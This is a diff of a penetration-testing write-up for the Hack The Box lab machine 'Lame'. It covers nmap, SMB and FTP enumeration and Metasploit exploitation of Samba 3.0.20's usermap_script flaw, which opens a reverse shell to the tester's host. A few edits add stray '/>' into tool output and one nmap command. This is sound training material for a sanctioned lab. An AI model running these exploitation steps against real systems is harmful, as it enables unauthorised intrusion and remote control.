@@ -39,8 +39,8 @@ Not shown: 65530 filtered tcp ports (no-response)
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 10.10.16.2
 |      Logged in as ftp
@@ -52,7 +52,7 @@ PORT     STATE SERVICE     VERSION
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
@@ -67,16 +67,16 @@ IP ID Sequence Generation: All zeros
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
-| smb-security-mode: 
-|   account_used: <blank>
+| smb-security-mode:
+|   account_used: <blank />
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Unix (Samba 3.0.20-Debian)
 |   Computer name: lame
-|   NetBIOS computer name: 
+|   NetBIOS computer name:
 |   Domain name: hackthebox.gr
 |   FQDN: lame.hackthebox.gr
 |_  System time: 2022-03-24T03:58:10-04:00
@@ -93,7 +93,7 @@ A faster, more concise approach to scanning our target is to do it in two parts:
 
 First, scan all ports: `sudo nmap -v $TARGET_IP -Pn -p- --min-rate=5000 -o $OUTPUT_FILE`
 
-Second, run vulnerability scan ONLY on the open ports: `sudo nmap -v $TARGET_IP p-<open ports> -sC -sV -O --min-rate=5000 -o $OUTPUT_FILE`
+Second, run vulnerability scan ONLY on the open ports: `sudo nmap -v $TARGET_IP p-<open ports /> -sC -sV -O --min-rate=5000 -o $OUTPUT_FILE`
 
 :::
 
@@ -105,14 +105,14 @@ We have our open ports telling us smb is available, use `smbclient -L //$TARGET_
 
 ```bash
 └─$ smbclient -L //10.10.10.3
-Enter WORKGROUP\rxhackks password: 
+Enter WORKGROUP\rxhackks password:
 Anonymous login successful
 
         Sharename       Type      Comment
         ---------       ----      -------
         print$          Disk      Printer Drivers
         tmp             Disk      oh noes!
-        opt             Disk      
+        opt             Disk
         IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
         ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 Reconnecting with SMB1 for workgroup listing.
@@ -124,10 +124,10 @@ Anonymous login successful
         Workgroup            Master
         ---------            -------
         WORKGROUP            LAME
-                                                                                                                   
+
 ┌──(rxhackk㉿kali)-[~/…/RxHack/HTB/BOXES/LAME]-[tun0: 10.10.16.2]
-└─$ smbclient //10.10.10.3/opt                 
-Enter WORKGROUP\rxhackks password: 
+└─$ smbclient //10.10.10.3/opt
+Enter WORKGROUP\rxhackks password:
 Anonymous login successful
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
@@ -137,7 +137,7 @@ let's try `tmp` share
 ```bash
 ┌──(rxhackk㉿kali)-[~/…/RxHack/HTB/BOXES/LAME]-[tun0: 10.10.16.2]
 └─$ smbclient //10.10.10.3/tmp                                                                                 1 ⨯
-Enter WORKGROUP\rxhackks password: 
+Enter WORKGROUP\rxhackks password:
 Anonymous login successful
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -151,7 +151,7 @@ smb: \> dir
   vgauthsvclog.txt.0                  R     1600  Thu Mar 24 00:04:32 2022
 
                 7282168 blocks of size 1024. 5386456 blocks available
-smb: \> 
+smb: \>
 ```
 
 file `vgauthsvclog.txt.0` looks interesting cos its not zero-byte, `smb:\>get vgauthsvclog.txt.0` to download it.
@@ -159,29 +159,29 @@ file `vgauthsvclog.txt.0` looks interesting cos its not zero-byte, `smb:\>get vg
 Park that for a second and let's have a look at FTP
 
 ```bash
-─$ ftp 10.10.10.3                                                                                                 
-Connected to 10.10.10.3.                                                                                           
-220 (vsFTPd 2.3.4)                                                                                                 
-Name (10.10.10.3:rxhackk): anonymous                                                                               
-331 Please specify the password.                                                                                   
-Password:                                                                                                          
-230 Login successful.                                                                                              
-Remote system type is UNIX.                                                                                        
-Using binary mode to transfer files.                                                                               
-ftp> dir                                                                                                           
-229 Entering Extended Passive Mode (|||44364|).                                                                    
-150 Here comes the directory listing.                                                                              
-226 Directory send OK.                                                                                             
-ftp> ls                                                                                                            
-229 Entering Extended Passive Mode (|||64982|).                                                                    
-150 Here comes the directory listing.                                                                              
-226 Directory send OK.                                                                                             
-ftp> pwd                                                                                                           
-Remote directory: /                                                                                                
-ftp> ls -al                                                                                                        
+─$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:rxhackk): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||44364|).
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> ls
+229 Entering Extended Passive Mode (|||64982|).
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> pwd
+Remote directory: /
+ftp> ls -al
 229 Entering Extended Passive Mode (|||18234|).
 150 Here comes the directory listing.
-drwxr-xr-x    2 0        65534        4096 Mar 17  2010 . 
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
 drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 226 Directory send OK.
 ftp> cd ..
@@ -201,7 +201,7 @@ No files to download from FTP.
 Let's go back and check file from smb:
 
 ```bash
-└─$ cat vgauthsvclog.txt.0 
+└─$ cat vgauthsvclog.txt.0
 [Mar 23 07:04:31.888] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
 [Mar 23 07:04:31.888] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
 [Mar 23 07:04:31.888] [ message] [VGAuthService] Group 'service'
@@ -228,8 +228,8 @@ Looking back at Nmap results, that `vsFTPd 2.3.4` version looks familiar:
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 10.10.16.2
 |      Logged in as ftp
@@ -247,7 +247,7 @@ PORT     STATE SERVICE     VERSION
 Let's check searchsploit, to see if that vsftpd version in vulnerable:
 
 ```bash
-└─$ searchsploit vsFTPd 2.3.4                                                  
+└─$ searchsploit vsFTPd 2.3.4
 --------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                   |  Path
 --------------------------------------------------------------------------------- ---------------------------------
@@ -272,7 +272,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 10.10.10.3:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 ```
 
 Looks like its not FTP, then its SAMBA.
@@ -282,7 +282,7 @@ Looks like its not FTP, then its SAMBA.
 Looking up the samba version `3.0.20` in searchsploit:
 
 ```bash
-└─$ searchsploit samba 3.0.20 
+└─$ searchsploit samba 3.0.20
 --------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                   |  Path
 --------------------------------------------------------------------------------- ---------------------------------
@@ -298,20 +298,20 @@ Shellcodes: No Results
 Can't find any manual notes so I must have gone "easy mode" and just used metasploit:
 
 ```bash
-msf6 > search samba 3.0.20                                                                                         
-                                                                                                                   
-Matching Modules                                                                                                   
-================                                                                                                   
-                                                                                                                   
-   #  Name                                Disclosure Date  Rank       Check  Description                           
-   -  ----                                ---------------  ----       -----  -----------                           
+msf6 > search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
    0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Ex
-ecution                                                                                                            
-                                                                                                                   
-                                                                                                                   
-Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script       
-                                                                                                                   
-msf6 > use exploit/multi/samba/usermap_script                                                                      
+ecution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use exploit/multi/samba/usermap_script
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
 RHOSTS => 10.10.10.3
@@ -319,7 +319,7 @@ msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
 LHOST => tun0
 msf6 exploit(multi/samba/usermap_script) > run
 
-[*] Started reverse TCP handler on 10.10.16.2:4444 
+[*] Started reverse TCP handler on 10.10.16.2:4444
 [*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.3:35844 ) at 2022-03-24 21:41:22 +1300
 
 
@@ -336,7 +336,7 @@ User and Root flags for the taking:
 ```bash
 # root.txt
 
-ls /root  
+ls /root
 Desktop
 reset_logs.sh
 root.txt
